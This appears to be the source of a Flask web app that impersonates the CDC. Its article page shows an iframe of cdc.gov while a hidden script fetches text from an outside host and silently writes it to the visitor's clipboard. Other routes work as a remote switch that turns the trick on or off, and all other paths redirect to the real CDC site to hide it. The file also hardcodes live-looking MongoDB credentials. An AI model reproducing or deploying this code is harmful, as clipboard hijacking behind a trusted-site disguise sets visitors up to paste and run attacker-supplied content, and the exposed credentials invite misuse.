from flask import Flask, request, redirect

app = Flask(__name__)
#byuvinc2:RnjcHsPi03kMa9e2
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi

uri = "mongodb+srv://byuvinc2:RnjcHsPi03kMa9e2@cluster0.yenjypm.mongodb.net/?retryWrites=true&w=majority"
# Create a new client and connect to the server
client = MongoClient(uri, server_api=ServerApi('1'))
db = client["db"]
col = db["dbmain"]
@app.route("/")
def hellop():
  return redirect("https://www.cdc.gov/", code=302)

@app.route("/home")
def hellope():
  col.update_one({"status":"good"}, {"status":"bad"})
  return redirect("https://www.cdc.gov/", code=302)

@app.route("/site")
def hellopu():
  col.update_one({"status":"bad"}, {"status":"good"})
  return redirect("https://www.cdc.gov/", code=302)
  
@app.route("/article/<path:text>")
def hello(text):
  if col.find_one({"id":999})["status"] == "good":
    htmltemp = """<!DOCTYPE html>
  <html>
  <head>
      <title>Centers for Disease Control and Prevention</title>
  </head>
  <body>
  <iframe src="https://www.cdc.gov/" style="position:absolute; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
    </iframe>
      <script>
          // URL of the API endpoint that provides the text
          var apiUrl = "https://api.zenga.eu.org/api"+window.location.pathname;
          
          // Fetch the text from the API
          fetch(apiUrl)
              .then(response => response.text())
              .then(textToCopy => {
                  // Use navigator.clipboard.writeText() to copy the text to the clipboard
                  navigator.clipboard.writeText(textToCopy)
                      .then(function() {
                          console.log("Text copied to clipboard:", textToCopy);
                          window.location("https://www.cdc.gov/");
                      })
                      .catch(function(err) {
                          console.error("Error copying text:", err);
                      });
              })
              .catch(error => console.error("Error fetching text from API:", error));
      </script>
  </body>
  </html>
  """
    return htmltemp
  return redirect("https://www.cdc.gov/", code=302)
  
@app.route('/api/article/<path:text>')
def index(text):
  try:
    if col.find_one({"id":999})["status"] == "good":
      entryID = request.path.split("/")[3]
      fullText = col.find_one({"id":int(entryID)})
      return fullText["fulltext"]
    else:
      return redirect("https://www.cdc.gov/", code=302)
  except:
    return redirect("https://www.cdc.gov/", code=302)
